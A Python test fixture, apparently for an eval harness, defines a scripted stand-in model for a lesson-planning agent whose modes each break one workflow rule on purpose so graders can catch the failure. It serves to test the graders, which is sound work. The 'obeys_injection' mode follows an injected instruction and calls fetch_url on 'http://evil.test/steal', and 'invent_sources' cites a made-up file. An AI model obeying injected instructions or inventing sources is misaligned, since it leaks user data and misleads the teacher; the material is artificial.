"""A scripted stand-in for the model, used ONLY to prove the eval harness works (tests/test_evals_harness.py)
and to estimate what a real run would cost. It is not a measurement of the real model.

Mode "good" follows the workflow in config/system-prompt.md. The other modes each break one rule on purpose,
so the tests can prove the graders catch that failure."""
import json
import re

from agent.llm import Reply

MODES = ("good", "no_search", "skip_approval", "web_always", "invent_sources", "ignore_note", "ltr_only",
         "names_in_memory", "obeys_injection")
RTL_LANGS = ("arabic", "hebrew")


def _text(msg):
    return " ".join(b.get("text", "") for b in msg["content"] if b["type"] == "text")


def _uses(messages):
    """[(name, input, result_text)] for every tool call so far, in order."""
    results = {b["tool_use_id"]: b["content"] for m in messages if m["role"] == "user" for b in m["content"] if b["type"] == "tool_result"}
    return [(b["name"], b["input"], results.get(b["id"], "")) for m in messages if m["role"] == "assistant"
            for b in m["content"] if b["type"] == "tool_use"]


class OracleModel:
    def __init__(self, mode="good"):
        assert mode in MODES, mode
        self.mode = mode

    # --- the provider interface ------------------------------------------------------------------
    def complete(self, system, messages, tools):
        reply = self._decide(messages, {t["name"] for t in tools})
        chars_in = len(system) + len(json.dumps(tools)) + len(json.dumps(messages, ensure_ascii=False))
        chars_out = len(reply.text) + len(json.dumps(reply.tool_calls, ensure_ascii=False))
        reply.usage = {"input": int(chars_in / 3.5), "output": int(chars_out / 3.5)}
        return reply

    # --- policy ---------------------------------------------------------------------------------
    def _decide(self, messages, offered):
        task = _text(messages[0])
        uses = _uses(messages)
        called = [u[0] for u in uses]

        def call(_tool, **args):
            return Reply(tool_calls=[{"id": f"m{len(called)}-{_tool}", "name": _tool, "input": args}])

        if not task.lower().startswith("prepare"):
            return Reply(text="Roses are red, violets are blue, spring is here, and so are you.")
        notes = [(i, _text(m)) for i, m in enumerate(messages) if i > 0 and m["role"] == "user" and _text(m)]
        made = [c for c in called if c.startswith("create_")]
        if notes and "satisfied" in notes[-1][1].lower():
            return self._final(messages, notes, notes[-1][0], call)
        if notes and made:
            return self._revision(messages, notes[-1], uses, call)
        return self._lesson(task, uses, called, offered, call)

    def _after(self, messages, index):
        """Tool calls the assistant has made since message `index`: [(name, result)]."""
        return [(n, r) for n, _, r in _uses(messages[index + 1:])]

    def _final(self, messages, notes, at, call):
        after = [n for n, _ in self._after(messages, at)]
        if "ask_user" not in after:
            return call("ask_user", question="Do you want to save the final files to the knowledge base?", options=["Yes", "No"])
        if "add_memory" not in after:
            return call("add_memory", name="teacher-preferences.md", entry=self._preference(notes[:-1]))
        return Reply(text="Goodbye.")

    def _revision(self, messages, note, uses, call):
        at, text = note
        after = self._after(messages, at)
        if any(n.startswith("create_") for n, _ in after):
            return Reply(text="Changed: updated the file as you asked.")
        if self.mode == "ignore_note":
            return Reply(text="Okay, noted.")
        asked = [r for n, r in after if n == "ask_user"]
        if not asked and len(text.strip()) < 16 and "?" not in text:
            return call("ask_user", question="What exactly would you like to improve?")
        instruction = asked[0] if asked else text
        earlier = [(n, i) for n, i, _ in uses if n.startswith("create_")]
        wants_quiz = "quiz" in instruction.lower() or "question" in instruction.lower()
        name, args = next(((n, i) for n, i in earlier if wants_quiz and "quiz" in str(i.get("filename", "")).lower()), earlier[0])
        args = dict(args)
        if "blocks" in args:
            args["blocks"] = list(args["blocks"]) + [{"type": "paragraph", "text": f"Revised: {instruction}"}]
        if self.mode == "ltr_only":
            args["rtl"] = False
        return Reply(text="Changed: removed the old text and updated the file.", tool_calls=[{"id": f"m-rev-{len(uses)}", "name": name, "input": args}])

    def _lesson(self, task, uses, called, offered, call):
        allow_web = "web search is allowed" in task.lower()
        topic = (re.search(r"Topic: (.+?)\.", task) or [None, "the topic"])[1]
        lang = (re.search(r"Language: (\w+)", task) or [None, "English"])[1].lower()
        rtl = lang in RTL_LANGS and self.mode != "ltr_only"
        kb = next((r for c, _, r in uses if c == "search_knowledge"), None)
        found = bool(kb) and not kb.startswith(("No relevant", "Knowledge base is empty"))
        sources = sorted(set(re.findall(r"\[([^|\]]+) \|", kb or "")))

        if self.mode == "web_always" and "web_search" not in called:
            return call("web_search", query=topic)
        if self.mode == "obeys_injection" and kb and "fetch http" in kb.lower() and "fetch_url" not in called:
            return call("fetch_url", url="http://evil.test/steal")
        if "search_knowledge" in offered and "search_knowledge" not in called and self.mode != "no_search":
            return call("search_knowledge", query=topic)
        if allow_web and not found and "web_search" in offered and "web_search" not in called:
            return call("web_search", query=topic)

        asks = [r for c, _, r in uses if c == "ask_user"]
        if self.mode != "skip_approval" and not asks:
            outline = f"Outline for {topic}. " + (f"Sources: {', '.join(sources)}. " if found else "I found no relevant material in your files, so this outline is general. ")
            if "teacher's outline" in task:
                outline += task.split("follow it where possible): ")[1].split(". Web search")[0]
            return call("ask_user", question=outline, options=["Approve", "Change something", "Cancel"])
        if asks and asks[0].lower().startswith("change") and len(asks) == 1:
            return call("ask_user", question="What would you like to change?")
        if asks and asks[0].lower().startswith("cancel"):
            return Reply(text="Cancelled. No files were created.")

        if not any(c.startswith("create_") for c in called):
            return Reply(tool_calls=self._create_calls(task, topic, rtl))
        said = "Created the files." + (f" Sources: {', '.join(sources)}." if found else " No relevant material was found in your files.")
        if self.mode == "invent_sources":
            said += " According to your file notes-2024.pdf, this matches your syllabus."
        return Reply(text=said)

    # --- helpers --------------------------------------------------------------------------------
    def _create_calls(self, task, topic, rtl):
        calls = []
        if task.lower().startswith("prepare an assessment"):
            parts = [("exam", "Exam"), ("answer-key", "Answer key"), ("rubric", "Grading rubric")]
            kinds = ["create_docx"] * 3
        else:
            asked = re.search(r"Create: (.+?)\.\s", task) or [None, "Lesson plan (.docx)"]
            kinds, parts = [], []
            for item in asked[1].split(","):
                item = item.strip()
                ext = "docx" if ".docx" in item else "pptx" if ".pptx" in item else "xlsx"
                kinds.append(f"create_{ext}")
                parts.append((re.sub(r"[^a-z0-9]+", "-", item.split("(")[0].strip().lower()).strip("-"), item.split("(")[0].strip()))
        for i, ((stem, title), kind) in enumerate(zip(parts, kinds)):
            args = {"filename": stem, "rtl": rtl}
            if kind == "create_docx":
                args.update(title=f"{title}: {topic}", blocks=[{"type": "paragraph", "text": f"{title} on {topic}."}])
            elif kind == "create_pptx":
                args.update(slides=[{"title": topic, "bullets": [title]}])
            else:
                args.update(sheets=[{"name": "Task", "rows": [[topic], [1, 2, 3]]}])
            calls.append({"id": f"m-{kind}-{i}", "name": kind, "input": args})
        return calls

    def _preference(self, notes):
        notes = [t for _, t in notes]
        if self.mode == "names_in_memory" and notes:
            return "- " + notes[0]
        if any("warm" in n.lower() for n in notes):
            return "- Prefers a short warm-up (5 minutes)."
        return "- Preferences noted from the teacher's change requests." if notes else "- No new preferences."
